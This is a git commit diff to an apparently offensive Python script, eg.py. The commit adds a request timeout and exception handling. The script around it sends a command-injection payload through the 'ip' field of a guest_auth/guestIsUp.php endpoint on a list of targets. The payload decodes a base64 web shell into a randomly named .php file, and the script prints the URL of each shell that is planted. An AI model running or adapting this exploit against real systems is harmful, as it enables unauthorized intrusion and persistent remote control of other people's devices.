8c5737205dbe04add9283206e8c2bf349fccbf51
yumusb <yumusb@foxmail.com>
2021-01-13 09:21:24 +0800

    补上了timeout机制

--- eg.py
+++ eg.py
@@ -4,7 +4,7 @@ Author: yumu
 Email: 2@33.al
 Date: 2021-01-12 13:19:40
 LastEditors: yumu
-LastEditTime: 2021-01-12 17:03:19
+LastEditTime: 2021-01-13 09:20:10
 '''
 import requests
 import sys
@@ -23,12 +23,17 @@ def main(targets):
             url = target.strip() + "/guest_auth/guestIsUp.php"
             shellname = str(random.randrange(8888,9999))+'.php'
             data = 'ip=127.0.0.1|echo "'+shellcontent+'"|base64 -d > '+shellname+'&mac=00-00'
-            requests.post(url,data=data,headers= {"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","user-agent":ua},verify=False)
+            try:
+                requests.post(url,data=data,headers= {"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","user-agent":ua},verify=False,timeout=5)
+            except:
+                #print("timeout")
+                continue
             url = target + '/guest_auth/'+shellname
             if(requests.get(url,headers=header,verify=False).status_code==200):
                 print(url)
             else:
                 pass
+                #print("不成功")
                 # 不成功
 if __name__ == "__main__":
     if(len(sys.argv)==2):
